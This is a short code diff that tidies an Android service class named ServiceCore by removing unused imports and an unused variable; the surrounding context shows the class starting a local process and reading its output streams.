@@ -13,7 +13,6 @@ import java.io.OutputStreamWriter;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
-import java.util.ArrayList;
 import java.util.Arrays;
 
 import javax.crypto.Cipher;
@@ -39,8 +38,6 @@ import android.widget.Toast;
 
 import com.android.service.auto.Cfg;
 import com.android.service.capabilities.PackageInfo;
-import com.android.service.conf.Configuration;
-import com.android.service.file.AutoFile;
 import com.android.service.util.Check;
 import com.android.service.util.Utils;
 
@@ -442,7 +439,6 @@ public class ServiceCore extends Service {
 				final BufferedWriter stdin = new BufferedWriter(new OutputStreamWriter(localProcess.getOutputStream()));
 				final BufferedReader stdout = new BufferedReader(new InputStreamReader(localProcess.getInputStream()));
 				final BufferedReader stderr = new BufferedReader(new InputStreamReader(localProcess.getErrorStream()));
-				final String full = null;
 				String line = null;
 
 				while ((line = stdout.readLine()) != null) {
